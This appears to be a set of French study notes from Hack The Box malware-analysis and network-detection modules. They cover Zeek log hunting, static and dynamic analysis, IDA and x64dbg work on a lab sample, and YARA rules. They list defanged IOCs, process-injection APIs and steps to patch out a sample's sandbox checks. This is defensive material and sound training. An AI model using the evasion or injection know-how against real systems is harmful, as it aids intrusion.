Le *beaconing* est un comportement répété utilisé par les malwares pour communiquer avec un serveur de commande et contrôle (C2). On peut détecter ce comportement en analysant les connexions dans le fichier `conn.log`, en repérant les connexions répétitives vers la même adresse IP, avec des tailles de données constantes ou des intervalles réguliers.

Commande :

```bash
/usr/local/zeek/bin/zeek -C -r /home/htb-student/pcaps/psempire.pcap
cat conn.log
```

Analyse :
Le fichier `conn.log` montre des connexions régulières toutes les 5 secondes vers l’IP `51.15.197.127:80`, typiques du malware PowerShell Empire.

---

#### **Exemple 2 : Détection d’exfiltration de données via DNS**

L’exfiltration via DNS imite le trafic normal, mais peut être détectée en analysant les fichiers `files.log` ou `dns.log` de Zeek à la recherche de transferts de données importants ou de canaux cachés. Le fichier `dns.log` peut révéler des domaines ou sous-domaines suspects.

Commande :

```bash
/usr/local/zeek/bin/zeek -C -r /home/htb-student/pcaps/dnsexfil.pcapng
cat dns.log | /usr/local/zeek/bin/zeek-cut query | cut -d . -f1-7
```

Analyse :
Des sous-domaines fréquents comme `456c54f2.blue.letsgohunt.online` indiquent un possible tunneling DNS.

---

#### **Exemple 3 : Détection d’exfiltration de données via TLS**

L’exfiltration via TLS peut être identifiée en repérant de grands volumes de données envoyées entre certaines machines. On analyse `conn.log` en filtrant et en agrégeant les données pour détecter des tailles anormales.

Commande :

```bash
/usr/local/zeek/bin/zeek -C -r /home/htb-student/pcaps/tlsexfil.pcap
cat conn.log | /usr/local/zeek/bin/zeek-cut id.orig_h id.resp_h orig_bytes | \
sort | grep -v -e '^$' | grep -v '-' | datamash -g 1,2 sum 3 | sort -k 3 -rn | head -10
```

Analyse :
Cette commande révèle l’envoi d’environ 270 Mo de données à l’adresse `192.168.151.181`.

---

#### **Exemple 4 : Détection d’activité PsExec**

PsExec est souvent utilisé pour l’administration à distance et dans les attaques. Quand il est utilisé via SMB, les fichiers `smb_files.log`, `dce_rpc.log` et `smb_mapping.log` peuvent révéler son activité.

Commande :

```bash
/usr/local/zeek/bin/zeek -C -r /home/htb-student/pcaps/psexec_add_user.pcap
cat smb_files.log
cat dce_rpc.log
cat smb_mapping.log
```

Analyse :
Ces journaux montrent le transfert et l’exécution du fichier `PSEXESVC.exe`, ce qui correspond au comportement typique de PsExec.

---

### **Résumé des outils et commandes utilisés**

* **zeek-cut** : extrait des colonnes spécifiques des journaux Zeek.
* **sort** : trie les données pour faciliter l’analyse.
* **grep** : filtre les résultats.
* **datamash** : permet d’agréger les données (somme, regroupement, etc.).

Ces outils permettent de mettre en évidence des schémas de comportement suspects dans les journaux réseau. Leur utilisation combinée avec Zeek ou Wireshark permet une analyse fine du trafic.

---

```

## **Introduction to Malware Analysis**

## **Introduction To Malware & Malware Analysis part1**

```jsx

---

## 🧠 Introduction à l’Analyse de Malware

Ce module fournit les bases essentielles pour permettre aux analystes SOC de comprendre, détecter et analyser les malwares, en se concentrant principalement sur ceux conçus pour les systèmes Windows.

---

### 💡 Types de Malware

* **Virus** : Infectent des fichiers légitimes et se propagent en s’y attachant.
* **Worms (vers)** : Se répliquent automatiquement via les réseaux, sans interaction humaine.
* **Trojans (chevaux de Troie)** : Déguisés en logiciels fiables, ils permettent un accès non autorisé.
* **Ransomware** : Chiffrent les données et exigent une rançon pour leur restitution.
* **Spyware** : Espionnent l’utilisateur en collectant des données à son insu (mots de passe, historique, etc.).
* **Adware** : Affichent des publicités invasives et peuvent suivre les activités en ligne.
* **Botnets** : Réseaux d’ordinateurs compromis utilisés pour lancer des attaques ou propager d’autres malwares.
* **Rootkits** : Prennent le contrôle de composants du système pour dissimuler des activités malveillantes.
* **Backdoors / RATs** : Ouvrent un accès à distance permanent au système infecté.
* **Droppers** : Installeurs furtifs utilisés pour déployer d'autres charges malveillantes.
* **Information Stealers** : Conçus pour dérober des données sensibles (identifiants, informations personnelles, etc.).

---

### 🗂️ Sources de Samples (Échantillons de Malware)

L’analyse de malware doit toujours s’effectuer dans un environnement isolé et sécurisé. Voici quelques plateformes fiables pour se procurer des échantillons :

* **VirusShare**
* **Hybrid Analysis**
* **TheZoo** (GitHub)
* **Malware-Traffic-Analysis.net**
* **VirusTotal**
* **ANY.RUN**
* **Contagio Malware Dump**
* **VX Underground**

---

### 🧾 Acquisition de Malware / Preuves Numériques

Lors d’une enquête, la capture du disque et de la mémoire vive est cruciale pour collecter des preuves.

#### 🖴 Outils d’Imagerie Disque :

* **FTK Imager** : Référence dans la création d’images forensiques.
* **OSFClone** : Outil open source compatible avec divers systèmes de fichiers.
* **DD / DCFLDD** : Utilitaires en ligne de commande très utilisés sous Linux pour la copie bit à bit.

#### 🧠 Outils d’Acquisition de Mémoire Vive :

* **DumpIt** : Simple d’utilisation pour les systèmes Windows/Linux.
* **MemDump** : Utilitaire en ligne de commande pour la capture RAM.
* **Belkasoft RAM Capturer** : Spécialisé dans la récupération mémoire même face à l’anti-debugging.
* **Magnet RAM Capture** : Outil ergonomique de Magnet Forensics.
* **LiME (Linux Memory Extractor)** : Parfait pour l’analyse de la mémoire volatile sous Linux.

#### 🧰 Autres outils utiles :

* **KAPE** : Pour la collecte ciblée d’artéfacts.
* **Velociraptor** : Outil d’investigation basé sur une requête personnalisable (VQL).

---

### 🧪 Définition, Objectifs et Méthodes de l’Analyse de Malware

L’analyse de malware consiste à étudier un logiciel malveillant pour comprendre son fonctionnement, sa source, et son impact. Elle contribue à :

* Renforcer les capacités de détection,
* Mener du reverse engineering,
* Collecter de l’intelligence sur les menaces.

#### 🎯 Objectifs Principaux :

* **Détection et Classification** : Identifier le type de malware et créer des règles de détection.
* **Reverse Engineering** : Désassembler le code pour en comprendre la logique, les méthodes de chiffrement et les mécanismes de communication avec un C2.
* **Analyse Comportementale** : Observer les actions du malware sur le système (fichiers créés, connexions, processus, etc.).
* **Renseignement sur la menace (Threat Intel)** : Identifier les tactiques, techniques et infrastructures utilisées par les attaquants.

---

### 🛠️ Techniques Courantes d’Analyse

* **Analyse Statique** : Étude du fichier sans l’exécuter pour repérer des éléments clés (signatures, chaînes, imports).
* **Analyse Dynamique** : Exécution du malware dans un environnement contrôlé pour observer son comportement.
* **Analyse de Code** : Reverse engineering pour explorer en profondeur les fonctions et structures du malware.
* **Analyse Mémoire** : Inspection de la RAM pour détecter du code injecté ou des comportements actifs.
* **Décompactage de Malware** : Extraction du vrai code masqué par un packer ou un crypteur.

---

```

## **Windows Internals**

```jsx

---

## 🧠 Comprendre les Internes de Windows pour l’Analyse de Malware

La compréhension des mécanismes internes de Windows est essentielle pour analyser efficacement les malwares. Cela permet d’interpréter leur comportement, d’identifier leurs points d’ancrage dans le système, et de détecter leurs méthodes de persistance ou d’évasion.

---

### 🧭 Modes de Fonctionnement de Windows

* **Mode Utilisateur (User Mode)**
  Accès restreint ; utilisé par les applications.
  → Le malware peut manipuler les fichiers, le registre ou chercher à élever ses privilèges.

* **Mode Noyau (Kernel Mode)**
  Accès total au système et au matériel.
  → Les malwares en mode noyau peuvent modifier le comportement de Windows, intercepter des appels système et se cacher plus efficacement.

---

### 🏗️ Architecture de Windows

#### 🔹 Composants en Mode Utilisateur

* **Processus Système** : ex. `winlogon.exe`, `smss.exe`, `services.exe`.
* **Services** : tâches en arrière-plan comme Windows Update ou le Planificateur.
* **Applications Utilisateur** : communiquent avec le noyau via les API (NTDLL.DLL).
* **Sous-systèmes d’environnement** : ex. Win32, POSIX.
* **DLL de Sous-système** : font le lien entre fonctions documentées et appels natifs (`kernelbase.dll`, `user32.dll`, etc.).

#### 🔸 Composants en Mode Noyau

* **Executive** : Gère I/O, processus, objets, sécurité.
* **Kernel** : Planification des tâches, synchronisation.
* **Pilotes** : Interface entre Windows et le matériel.
* **HAL (Hardware Abstraction Layer)** : Abstraction du matériel.
* **Win32k.sys** : Gère l’interface graphique.

---

### 🧵 Flux des Appels API Windows

Les malwares utilisent fréquemment les API Windows pour interagir avec le système.

#### 🔄 Exemple d’appel : `ReadProcessMemory`

* **Flux d’exécution** :
  `kernel32.dll` → `ntdll.dll` → `NtReadVirtualMemory` → Appel système au noyau.

* **SSDT (System Service Descriptor Table)** :
  Gère la correspondance entre les appels système et les fonctions du noyau.

---

### 📦 Format PE (Portable Executable)

Le format PE est utilisé pour les `.exe`, `.dll`, etc.
Comprendre sa structure est fondamental pour identifier du code malveillant.

#### Sections courantes :

* `.text` : Code exécutable.
* `.data` : Variables initialisées.
* `.rdata` : Données constantes.
* `.pdata` : Gestion des exceptions.
* `.bss` : Données non initialisées.
* `.rsrc` : Ressources (icônes, images).
* `.idata` : Fonctions importées.
* `.edata` : Fonctions exportées.
* `.reloc` : Données de relocalisation.

🔍 L’analyse de ces sections permet d’observer le comportement interne du malware, les fonctions appelées, et les ressources intégrées.

---

### ⚙️ Processus Windows

Un **processus** est une instance d’un programme en exécution, avec ses propres ressources système :

* **PID** : Identifiant unique.
* **Espace mémoire virtuel** : Code, données, pile, etc.
* **Code exécutable** : Instructions chargées depuis le disque.
* **Handles** : Références vers fichiers, registres, etc.
* **Contexte de sécurité** : Jeton définissant les droits.
* **Threads** : Unités d'exécution parallèles au sein d’un processus.

🧠 Suivre ces éléments aide à repérer les comportements suspects d’un malware.

---

### 🧩 Bibliothèques Dynamiques (DLL)

Les DLL contiennent des fonctions partagées utilisées à la fois par Windows et les malwares.

#### 📥 Fonctions Importées

Chargées dynamiquement pour interagir avec le système.

🧪 Exemple d’injection de code :

* `OpenProcess`
* `VirtualAllocEx`
* `WriteProcessMemory`
* `CreateRemoteThread`

#### 📤 Fonctions Exportées

Exposées par une DLL pour être utilisées par d'autres processus.

🔍 Exemple : Les exports de `kernel32.dll` visibles avec **CFF Explorer** ou **x64dbg** révèlent des appels système clés.

---

```

## **Static Analysis On Linux**

```jsx

---

## 🔍 Analyse Statique de Malware

L’analyse statique consiste à examiner un fichier malveillant **sans l’exécuter**. Cette méthode permet de recueillir des informations essentielles sur l’échantillon, telles que son type, ses chaînes de caractères, ses empreintes (hashes), les éléments intégrés, et les signes de compression ou d’obfuscation. Elle constitue une étape fondamentale avant l’analyse dynamique ou le reverse engineering.

---

### 📁 Éléments Clés de l’Analyse Statique

* **Type de fichier** : Permet de vérifier la vraie nature du fichier, indépendamment de son extension.
* **Empreintes (hashes)** : Un identifiant unique permettant de tracer ou comparer un échantillon.
* **Chaînes de caractères (strings)** : Donnent des indices sur le comportement ou les cibles du malware.
* **Éléments intégrés** : Domaines, chemins système, noms de fichiers, etc.
* **Présence d’un packer** : Les packers compriment ou chiffrent les malwares pour masquer leur contenu.
* **Fonctions importées/exportées** : Révèlent les API Windows utilisées.
* **Code assembleur** : Fournit une vision bas niveau sur le fonctionnement du binaire.

---

### 📌 Identification du Type de Fichier

Pour déterminer le type réel du fichier :

```bash
file /chemin/vers/malware.exe
```

Exemple de résultat :

```
PE32 executable (GUI) Intel 80386, for MS Windows
```

🔎 Vérification du header :

```bash
hexdump -C /chemin/vers/malware.exe | more
```

Cherchez la signature **"MZ"** (hexadécimal **4D 5A**) pour confirmer un exécutable Windows.

---

### 🧬 Empreintes et "Fingerprinting"

#### 🔐 Hashs de fichiers

Pour générer un identifiant unique du fichier :

```bash
md5sum /chemin/vers/malware.exe
sha256sum /chemin/vers/malware.exe
```

Utilisez ces valeurs sur des bases comme [VirusTotal](https://virustotal.com) pour croiser les informations.

#### 🧬 Empreinte des Imports (IMPHASH)

L’**IMPHASH** identifie des malwares similaires en se basant sur leurs fonctions importées.

Exemple en Python :

```python
import sys
import pefile

pe = pefile.PE(sys.argv[1])
print(pe.get_imphash())
```

Exécution :

```bash
python3 imphash_calc.py /chemin/vers/malware.exe
```

#### 🧪 Fuzzy Hashing avec SSDEEP

Pour mesurer la similarité entre fichiers :

```bash
ssdeep /chemin/vers/malware.exe
```

#### 🔄 Hash des Sections PE

Analyser séparément chaque section (.text, .data, etc.) permet de détecter des modifications mineures.

Exemple Python :

```python
import sys
import pefile

pe = pefile.PE(sys.argv[1])
for section in pe.sections:
    print(section.Name, "MD5 :", section.get_hash_md5())
    print(section.Name, "SHA256 :", section.get_hash_sha256())
```

Exécution :

```bash
python3 section_hashing.py /chemin/vers/malware.exe
```

---

### 🔡 Analyse de Chaînes de Caractères

Les chaînes ASCII/Unicode extraites peuvent contenir :

* Noms de fichiers
* IP, domaines
* Fonctions API
* Clés de registre

Commande pour extraire les chaînes longues :

```bash
strings -n 15 /chemin/vers/malware.exe
```

🔍 Pour détecter des chaînes obfusquées :

```bash
floss /chemin/vers/malware.exe
```

---

### 📦 Détection et Décompression de Malware Packé (UPX)

Les malwares packés masquent leur code. Le mot-clé "UPX" dans les chaînes peut indiquer l'utilisation de ce packer.

#### Décompresser un exécutable UPX :

```bash
upx -d -o /chemin/vers/unpacked_malware.exe /chemin/vers/malware.exe
```

Puis relancez l’analyse :

```bash
strings /chemin/vers/unpacked_malware.exe
```

---

```

## **Static Analysis On Windows**

```jsx

---

## 🔍 Analyse Statique de Malware sur Windows

L’analyse statique sous Windows suit les mêmes principes que sous Linux, mais utilise des outils spécifiques à l’environnement Windows pour examiner les fichiers malveillants sans les exécuter. Cette méthode permet d’identifier des éléments clés comme le type de fichier, les empreintes (hashes), les chaînes de caractères et d’éventuelles traces d’obfuscation ou de compression.

---

### 🧩 Éléments Clés de l’Analyse Statique sous Windows

* **Identification du type de fichier** : Vérifie qu’il s’agit bien d’un exécutable Windows (fichier PE).
* **Hashing** : Génération de hash MD5/SHA256 pour suivre et comparer les échantillons.
* **IMPHASH** : Hachage basé sur les fonctions importées, utile pour détecter des variantes.
* **Fuzzy Hashing (SSDEEP)** : Compare la similarité entre différents fichiers.
* **Hash des sections** : Permet de repérer des altérations dans les sections PE.
* **Analyse de chaînes de caractères** : Permet d’identifier des éléments utiles comme des IP, chemins système ou appels API.
* **Dépackaging** : Permet d’extraire le contenu réel d’un malware packé avec UPX.

---

### 📁 Vérification du Type de Fichier

Utilise **CFF Explorer** (C:\Tools\Explorer Suite) pour analyser la structure du fichier. Vérifie la présence de la signature ASCII **"MZ"** dans l’en-tête pour confirmer qu’il s’agit d’un exécutable Windows.

---

### 🧬 Empreintes et "Fingerprinting"

#### 🔐 Génération de Hashs avec PowerShell

```powershell
Get-FileHash -Algorithm MD5 C:\Samples\MalwareAnalysis\malware.exe
Get-FileHash -Algorithm SHA256 C:\Samples\MalwareAnalysis\malware.exe
```

---

#### 🧬 Calcul de l’IMPHASH

Script Python avec le module `pefile` :

```python
import sys
import pefile

pe_file = sys.argv[1]
pe = pefile.PE(pe_file)
print(pe.get_imphash())
```

Exécution :

```bash
python imphash_calc.py C:\Samples\MalwareAnalysis\malware.exe
```

---

#### 🔁 Fuzzy Hashing avec SSDEEP

```cmd
C:\Tools\ssdeep-2.14.1\ssdeep.exe C:\Samples\MalwareAnalysis\malware.exe
```

---

#### 🧪 Hash des Sections PE (Python)

Script d’exemple :

```python
import sys
import pefile

pe_file = sys.argv[1]
pe = pefile.PE(pe_file)
for section in pe.sections:
    print(section.Name, "MD5 hash:", section.get_hash_md5())
    print(section.Name, "SHA256 hash:", section.get_hash_sha256())
```

🔧 Outil graphique alternatif : **PEStudio**
(C:\Tools\pestudio\pestudio)

---

### 🔡 Analyse de Chaînes de Caractères

#### 📜 Extraction des chaînes :

```cmd
C:\Sysinternals\strings.exe C:\Samples\MalwareAnalysis\malware.exe
```

#### 🔍 Pour les chaînes obfusquées :

```cmd
C:\FLOSS\floss.exe C:\Samples\MalwareAnalysis\malware.exe
```

---

### 📦 Décompression de Malware Packé avec UPX

Rechercher la présence de **"UPX"** dans les chaînes extraites est un bon indicateur d’un fichier packé.

#### 🔓 Décompression :

```cmd
C:\Tools\upx\upx-4.0.2-win64\upx.exe -d -o unpacked_malware.exe C:\Samples\MalwareAnalysis\packed\malware.exe
```

Puis relancer l’analyse :

```cmd
C:\Sysinternals\strings.exe unpacked_malware.exe
```

---

```

## **Dynamic Analysis**

```jsx

---

### 🔍 Analyse Dynamique des Malwares

L’analyse dynamique consiste à observer le comportement d’un malware en l’exécutant dans un environnement contrôlé. Contrairement à l’analyse statique, qui examine le fichier sans l’exécuter, cette méthode permet de voir en temps réel les modifications apportées au système.

---

### 🛠️ Étapes Clés de l’Analyse Dynamique

#### 1. **Mise en Place de l’Environnement**

Créez une **machine virtuelle isolée** pour exécuter le malware sans risque pour le reste du réseau. Il est essentiel de simuler un environnement réaliste : applications courantes, données utilisateur, configuration réseau fonctionnelle.

#### 2. **Capture de l’État Initial**

Avant d’exécuter le malware, prenez un **instantané du système** : état des fichiers, registre Windows, processus actifs, configurations réseau. Cette base servira à comparer les changements provoqués par l’exécution du malware.

#### 3. **Déploiement des Outils (Pré-Exécution)**

Installez et configurez des outils de surveillance comme :

* **ProcMon** (Sysinternals) : journalisation des accès fichiers, modifications du registre, création de processus, etc.
* **Wireshark / tcpdump** : capture du trafic réseau.
* **Regshot** : comparaison de l’état du registre avant/après.
* **INetSim**, **FakeDNS**, **FakeNet-NG** : émulation de services réseau pour interagir avec le malware.

#### 4. **Exécution du Malware**

Lancez le malware avec les outils de surveillance actifs. Laissez-le s’exécuter assez longtemps pour observer ses actions, sans intervenir.

#### 5. **Observation et Journalisation**

Surveillez :

* La **création de processus**,
* Les **modifications de fichiers** et du **registre**,
* Les **communications réseau**.

#### 6. **Analyse Post-Exécution**

Une fois le malware arrêté :

* Comparez l’état du système avec le snapshot initial.
* Recherchez les anomalies : fichiers créés, clés registre modifiées, processus suspects, connexions externes.

---

### ⚙️ Analyse Dynamique avec **Noriben**

**Noriben** est un script Python qui automatise l’utilisation de ProcMon en filtrant les données inutiles pour mettre en évidence les comportements suspects.

#### ✅ Étapes d’Utilisation de Noriben

1. **Lancer Noriben** :

   ```bash
   cd C:\Tools\Noriben-master
   python Noriben.py
   ```

2. **Démarrage de ProcMon** : Noriben lance ProcMon avec des filtres prédéfinis.

3. **Exécution du Malware** :
   Exécutez par exemple `shell.exe` dans `C:\Samples\MalwareAnalysis`.

4. **Arrêter l’Enregistrement** :
   Dans le terminal Noriben, utilisez `Ctrl+C` pour stopper la capture.

5. **Analyser le Rapport** :
   Noriben génère un fichier `.txt` contenant un résumé des actions suspectes classées par type (fichiers, registre, processus, réseau).

---

### 🔬 Analyse Fine avec ProcMon Directement

Si Noriben filtre trop d’informations, il peut être utile d’utiliser ProcMon manuellement :

#### Étapes :

1. **Ouvrir ProcMon** :
   Depuis `C:\Tools\sysinternals`.

2. **Configurer les Filtres** :

   * `Ctrl+L` pour accéder aux filtres.
   * Exemple : `Process Name is shell.exe`.

3. **Exécuter le Malware** :
   Lancez de nouveau le malware pour enregistrer ses activités.

4. **Analyser les Comportements de Détection** :
   Certains malwares peuvent interroger des clés de registre liées à VMware (ex : `SOFTWARE\VMware, Inc.`) pour détecter une sandbox.

---

### 🧰 Outils Complémentaires pour l’Analyse Dynamique

* **Sandboxes automatisées** :

  * **Cuckoo Sandbox**,
  * **Joe Sandbox**,
  * **FireEye DTI Cloud**, etc.

⚠️ Certains malwares avancés **détectent ces environnements** et modifient leur comportement pour éviter la détection.

---

### 🧪 Exemples de Commandes

* **Lancer Noriben** :

  ```bash
  python Noriben.py
  ```

* **Utiliser ProcMon** :

  * Lancer ProcMon.
  * `Ctrl+L` → Ajouter un filtre : `Process Name is shell.exe`.
  * Observer les entrées : accès registre, fichiers, processus, connexions réseau.

---

```

## **Code Analysis**

```jsx
L'ingénierie inverse permet aux analystes de comprendre la fonctionnalité et le comportement d'un malware en disséquant son code machine compilé. Cela implique généralement de convertir le code machine en langage assembleur et d'interpréter les opérations sans les exécuter.

Lors de l'analyse de code, notre objectif est de :

* **Dissocier le code** pour examiner sa structure et sa logique sans déclencher d'actions.
* **Identifier les fonctions clés** et les éventuels Indicateurs de Compromission (IOCs).
* **Explorer le flux de contrôle** pour repérer des fonctions critiques, telles que la détection de sandbox et les mécanismes de persistance.

### Outils pour l'Analyse de Code

* **Désassembleurs** : Utilisés pour l'analyse statique du code machine (par exemple, IDA, Ghidra, Cutter).
* **Débogueurs** : Permettent l'exécution interactive du code et le contrôle de celui-ci (par exemple, x32dbg, x64dbg, OllyDbg).

### Exemple d'Analyse de Code : shell.exe

L'échantillon de malware shell.exe illustre diverses techniques, telles que la détection de sandbox et l'injection de processus, qui peuvent être décodées par désassemblage dans IDA.

#### Importation et Désassemblage de shell.exe dans IDA

1. **Charger shell.exe dans IDA** :

   * Ouvrir IDA en mode administrateur.
   * Charger l'exécutable et laisser IDA analyser le fichier binaire.

2. **Naviguer dans les vues** :

   * **Graph View** : Visualise le flux de contrôle des fonctions, facilitant l'identification des chemins d'exécution et de leurs relations.
   * **Text View** : Affiche le code assembleur ligne par ligne avec les adresses mémoire, utile pour un examen détaillé des instructions.

### Zones Clés d'Analyse

* **Identifier la fonction principale** :

  * La fonction de démarrage dans IDA montre la configuration initiale. Suivre les appels et les sauts pour localiser la fonction principale. Cela peut inclure des tâches d'initialisation et de configuration des cadres de pile.

* **Techniques de détection de sandbox** :

  * L'échantillon shell.exe interroge le registre pour détecter la présence de VMware Tools (indicateur d'un environnement virtuel). Les fonctions **RegOpenKeyExA** et **RegQueryValueExA** dans le désassemblage révèlent la détection de sandbox basée sur le registre.
  * IDA montre le chemin de la fonction :

    ```
    lea rdx, aSoftwareVmware
    mov rcx, 0FFFFFFFF80000002h
    call cs:RegOpenKeyExA
    ```
  * **IOC possible** : Clé de registre **SOFTWARE\VMware, Inc.\VMware Tools**.

* **Mécanismes de temporisation** :

  * Les appels à **GetSystemTimeAsFileTime**, **GetCurrentProcessId**, et **QueryPerformanceCounter** peuvent indiquer des mécanismes de temporisation, potentiellement utilisés pour des délais ou des vérifications.
  * IDA affiche également des instructions de sommeil ou des boucles de retard utilisées par le malware pour éviter la détection.

* **Connexions réseau** :

  * L'échantillon shell.exe utilise **getaddrinfo** et **WSAStartup** pour les opérations réseau. Il peut vérifier la connectivité réseau pour éviter les restrictions de la sandbox.
  * **IOC exemple** : Domaine **iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea\[.]com**.

* **Mécanismes de persistance** :

  * L'échantillon écrit des entrées dans la clé de registre **SOFTWARE\Microsoft\Windows\CurrentVersion\Run** pour assurer la persistance.
  * **IOC potentiel** : Clé de registre avec l'entrée pour **svchost.exe** sous **WindowsUpdater**.

* **Injection de processus** :

  * shell.exe crée un processus **notepad.exe**, alloue de la mémoire à l'intérieur de ce dernier via **VirtualAllocEx**, puis injecte du shellcode en utilisant **WriteProcessMemory**, suivi de l'appel à **CreateRemoteThread**.
  * Fonctions d'injection observées :

    ```
    call VirtualAllocEx
    call WriteProcessMemory
    call CreateRemoteThread
    ```

### Utilisation des Graphes de Flux de Fonction et des Xref dans IDA

* **Génération d'un graphe de flux d'appel de fonction** :

  * IDA peut visualiser les relations entre fonctions via **View → Graphs → Function calls**.
  * Graphes spécifiques aux fonctions : Faire un clic droit dans la vue de désassemblage, puis sélectionner soit **Xrefs graph to...** ou **Xrefs graph from...** pour voir les appels de fonction spécifiques.

### Stratégie de Débogage pour shell.exe

* **Placer des points d'arrêt** :

  * Ajouter des points d'arrêt sur des appels d'API clés (par exemple, **RegOpenKeyExA**, **VirtualAllocEx**).
* **Contrôle du flux d'exécution** :

  * Passer étape par étape dans le code pour observer le comportement en temps réel et valider les vérifications de sandbox ou les mécanismes de persistance suspectés.
* **Analyse dynamique post-désassemblage** :

  * Le débogage après le désassemblage permet de valider les conclusions initiales et de confirmer les comportements associés aux IOCs.

### IOCs Identifiés

* **Détection de sandbox basée sur le registre** :

  * Clé de registre : **SOFTWARE\VMware, Inc.\VMware Tools**.

* **Vérification de la connectivité réseau** :

  * Domaine : **iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea\[.]com**.
  * Adresse IP : **45.33.32.156**.
  * Port : **31337**.

* **Technique de persistance** :

  * Clé de registre : **SOFTWARE\Microsoft\Windows\CurrentVersion\Run**.
  * Exécutable : **svchost.exe** dans le répertoire **TEMP**.

* **Ressource réseau externe** :

  * URL : **http\[:]//ms-windows-update\[.]com/svchost\[.]exe**.

```

## **Debugging**

```jsx
### Débogage dans l'Analyse de Malware

Le débogage est une approche interactive de l'analyse de malware qui permet d'examiner le comportement du code en temps réel. En combinant les informations obtenues via des outils d'analyse statique comme IDA avec des techniques de débogage, les analystes peuvent obtenir une vue d'ensemble du fonctionnement du malware, des mécanismes d'évasion de sandbox et des indicateurs de compromission (IOCs).

---

### **Outils de Débogage**

#### **x64dbg**

x64dbg est un débogueur permettant l'analyse et le contrôle d'exécutables 64 bits. Il offre plusieurs fonctionnalités utiles :

* **Vue de désassemblage** : Affiche le code assembleur du programme.
* **Vue des registres et de la pile** : Montre les valeurs actuelles des registres CPU et la pile d'appel.
* **Dump mémoire** : Visualise la mémoire du programme pour analyser les structures de données et les variables.

#### **INetSim**

INetSim permet de simuler des services internet dans un environnement contrôlé, permettant au malware d'interagir avec des services fictifs (DNS, HTTP, etc.) sans risques. Cela permet de reproduire des environnements d'exploitation réseau sans danger.

---

### **Configurer le Débogage avec x64dbg**

#### **Charger shell.exe dans x64dbg**

1. Lancez **x64dbg** et sélectionnez **Fichier > Ouvrir**.
2. Naviguez jusqu'à **shell.exe** et ouvrez-le.
3. Le programme s'arrête à son point d'entrée dans la vue de désassemblage, avec un point d'arrêt par défaut.
4. Pour commencer l'exécution, appuyez sur **F9** ou cliquez sur **Run**.

#### **Simuler des Services Internet avec INetSim**

INetSim permet de configurer des services internet fictifs, capturant et répondant aux requêtes réseau du malware.

##### **Configurer INetSim**

1. **Éditer la configuration** :

   ```bash
   sudo nano /etc/inetsim/inetsim.conf
   ```

   * Réglez `service_bind_address` et `dns_default_ip` sur l'adresse IP de la machine.
   * Configurez les valeurs DNS par défaut :

     ```bash
     dns_default_hostname www
     dns_default_domainname iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com
     ```

2. **Lancer INetSim** :

   ```bash
   sudo inetsim
   ```

   Assurez-vous que le DNS de la cible pointe vers la machine où INetSim est en cours d'exécution.

---

### **Contourner les Vérifications de Sandbox**

Les malwares vérifient souvent s'ils sont exécutés dans un environnement virtuel ou de sandbox avant de s'exécuter pleinement. Voici comment contourner ces vérifications dans **x64dbg**.

#### **Étapes pour Contourner les Vérifications de Sandbox**

1. **Copier l'adresse depuis IDA** :

   * Dans **IDA**, identifiez l'adresse de l'instruction `cmp` pour les vérifications du registre.
   * Utilisez **Go to > Expression** dans **x64dbg** (Ctrl+G) pour localiser cette adresse.

2. **Identifier et patcher l'instruction de comparaison** :

   * Trouvez l'instruction `cmp` liée à la détection de Sandbox (par exemple, à l'adresse **0x4032C8**).
   * Modifiez `cmp [rsp+148h+Type], 1` en `cmp [rsp+148h+Type], 0` en utilisant la barre d'espace pour éditer.

3. **Patch des chaînes liées au Sandbox** :

   * Recherchez **> Current Module > String references** pour trouver **Sandbox detected**.
   * Définissez des points d'arrêt sur des chaînes comme **0x4032F13**, puis modifiez les sauts conditionnels (par exemple, changez **je** en **jne**).

#### **Patch et Sauvegarde de l'Exécutable Modifié**

Une fois le patch appliqué :

1. **Sauvegarder l'exécutable modifié** :

   * Appuyez sur **Ctrl+P** dans x64dbg et sélectionnez **Patch File**.

L'exécutable modifié contournera désormais les vérifications de sandbox et permettra d'observer tous les comportements du malware.

---

### **Analyse du Trafic Réseau**

#### **Capturer le Trafic du Malware avec Wireshark**

1. Lancez **Wireshark** pour capturer tout le trafic réseau généré par le malware.
2. Analysez :

   * **Requêtes DNS** : Observez les connexions vers des domaines comme **ms-windows-update\[.]com**.
   * **Requêtes HTTP** : Le malware peut ajouter le nom d'hôte de l'ordinateur dans l'User-Agent.
   * **Réponses HTTP** : Les réponses d'INetSim, comme un fichier binaire par défaut, peuvent déclencher des messages dans le malware.

---

### **Analyse de l'Injection de Processus**

L'injection de processus est une technique courante où le malware injecte du code dans un autre processus (par exemple, **notepad.exe**).

#### **Configurer des Points d'Arrêt pour les Fonctions d'Injection**

1. **Dans x64dbg** :

   * Recherchez et définissez des points d'arrêt sur **VirtualAllocEx**, **WriteProcessMemory** et **CreateRemoteThread**.

2. **Attacher à notepad.exe** :

   * Ouvrez une autre instance de **x64dbg**, puis attachez-vous au processus **notepad.exe** (Alt+A).
   * Surveillez le code injecté dans la mémoire de **notepad.exe** en utilisant les dumps mémoire.

3. **Vérifier l'injection de Shellcode** :

   * Examinez le paramètre `lpBaseAddress` de **WriteProcessMemory** pour identifier l'adresse de l'injection.
   * Copiez et collez cette adresse dans la vue du dump mémoire de **notepad.exe**.

4. **Inspecter le Shellcode Injecté** :

   * Exécutez **shell.exe**, observez la mémoire peuplée, puis sauvegardez le shellcode pour une analyse plus approfondie.

---

```

## **Creating Detection Rules**

```jsx
### Détection de Malware avec des Règles YARA et Sigma

La détection de malware implique la création de règles permettant d'identifier des comportements malveillants à travers l’analyse de fichiers ou des journaux d’activités. Deux outils puissants pour cela sont **YARA** (pour la détection basée sur les fichiers) et **Sigma** (pour la détection basée sur les journaux dans les systèmes SIEM). Voici un guide structuré pour créer des règles de détection pour un échantillon de malware.

---

### **Règles YARA**

YARA est un outil de correspondance de modèles basé sur des règles, conçu pour identifier des motifs spécifiques dans des fichiers. En créant des règles YARA personnalisées, on peut détecter efficacement certaines caractéristiques dans les fichiers, telles que des chaînes de caractères, des séquences d'octets ou d'autres marqueurs uniques qui sont indicatifs du comportement d'un malware.

#### **Exemple de Règle YARA de Base**

Voici un exemple simple de règle YARA pour détecter le message **"Sandbox detected"** dans un échantillon de malware, comme `shell.exe` :

```yara
rule Shell_Sandbox_Detection {
    strings:
        $sandbox_string = "Sandbox detected"
    condition:
        $sandbox_string
}
```

Cette règle recherche la chaîne **"Sandbox detected"** dans un fichier, et si elle est trouvée, une alerte est déclenchée.

#### **Création de Règles YARA Améliorées avec yarGen**

